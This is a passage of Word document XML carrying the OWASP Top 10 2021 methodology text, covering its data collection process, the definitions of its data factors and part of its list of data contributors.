          <w:ins w:id="142" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="143" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## What is your data collection and analysis process?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="47926BC8" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="144" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="573DA030" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="145" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="146" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>We formalized the OWASP Top 10 data collection process at the Open Security Summit in 2017. OWASP Top 10 leaders and the community spent two days working out formalizing a transparent data collection process. The 2021 edition is the second time we have used this methodology.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="723724AE" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="147" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48871FD8" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="148" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>We publish a call for data through social media channels available to us, both project and OWASP. On the OWASP Project page, we list the data elements and structure we are looking for and how to submit them. In the GitHub project, we have example files that serve as templates. We work with</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> organizations</w:t>
      </w:r>
      <w:ins w:id="149" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> as needed to help figure out the structure and mapping to CWEs</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02DD8C65" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="085FB9E3" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="150" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="151" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">We get data from organizations that are testing vendors by trade, bug bounty vendors, and organizations that contribute internal testing data. Once we have the data, we load it together and run a fundamental </w:t>
        </w:r>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>analysis of what CWEs map to risk categories. There is overlap between some CWEs, and others are very closely related (ex. Cryptographic vulnerabilities). Any decisions related to the raw data submitted are documented and published to be open and transparent with how we normalized the data.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5B6AFFF9" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="152" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32EAE15E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="153" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="154" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">We look at the eight categories with the highest incidence rates for inclusion in the Top 10. We also look at the Top 10 community survey results to see which ones may already be present in the data. The top two votes that aren't already present in the data will be selected for the other two places in the Top 10. Once all ten were selected, we applied generalized factors for exploitability and impact; to help rank the Top 10 2021 in a </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>risk based</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> order.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="77D4AF9B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="155" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3561D30E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="156" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="157" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Data Factors</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="04EAA2C5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="158" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38731B83" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="159" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="160" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>There are data factors that are listed for each of the Top 10 Categories, here is what they mean:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="32F3300E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="161" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36875D28" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="162" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="163" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- CWEs Mapped: The number of CWEs mapped to a category by the Top 10 team.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="020D99BB" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="164" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="165" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- Incidence Rate: Incidence rate is the percentage of applications vulnerable to that CWE from the population tested by that org for that year.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5ECF5860" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="166" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="167" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- Weighted Exploit: The Exploit sub-score from CVSSv2 and CVSSv3 scores assigned to CVEs mapped to CWEs, normalized, and placed on a 10pt scale.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="537E329E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="168" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="169" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- Weighted Impact: The Impact sub-score from CVSSv2 and CVSSv3 scores assigned to CVEs mapped to CWEs, normalized, and placed on a 10pt scale.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2B68BCC7" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="170" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="171" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- (Testing) Coverage: The percentage of applications tested by all organizations for a given CWE.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6C1EEEEA" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="172" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="173" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- Total Occurrences: Total number of applications found to have the CWEs mapped to a category.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="79C071ED" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="174" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="175" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- Total CVEs: Total number of CVEs in the NVD DB that were mapped to the CWEs mapped to a category.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="66DF9917" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="176" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B00FB45" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="177" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="178" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Thank you to our data contributors</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5FB45FD4" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="179" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="25CD3916" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="180" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="181" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>The following organizations (along with some anonymous donors) kindly donated data for over 500,000 applications to make this the largest and most comprehensive application security data set. Without you, this would not be possible.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4D13B824" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="182" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="088C0AEF" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="183" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="184" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- AppSec Labs</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7F8C1BBB" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="185" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="186" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- Cobalt.io</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3D10DBE1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="187" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="188" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- Contrast Security</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4AD025D2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="189" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="190" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- GitLab</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2E47D663" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="191" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="192" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>HackerOne</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:ins>
    </w:p>
    <w:p w14:paraId="14F8596D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="193" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="194" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- HCL Technologies</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="168B6CB0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="195" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="196" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- Micro Focus</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7DD5575A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="197" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="198" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>PenTest</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-Tools</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7C851978" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="199" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="200" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- </w:t>
        </w:r>
